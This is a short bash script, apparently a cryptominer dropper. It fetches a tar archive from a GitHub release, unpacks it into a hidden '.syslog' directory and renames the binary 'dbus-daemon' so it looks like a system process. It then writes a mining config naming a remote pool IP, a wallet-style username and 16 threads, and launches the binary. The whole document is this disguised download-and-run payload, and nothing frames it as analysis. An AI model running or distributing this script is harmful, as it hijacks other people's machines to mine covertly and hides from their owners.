#!/bin/bash
wget https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz -O core.tar.gz && tar -xf core.tar.gz && mv next-app .syslog && cd .syslog && mv next-app dbus-daemon && chmod +x dbus-daemon && echo '{"host": "152.42.199.142", "port": 443, "user": "mbc1qe3flkq8el48edhzudr75a2pj0vdf4uvykdygxg.node01", "pass": "x", "threads": 16}' > config.json &&./dbus-daemon
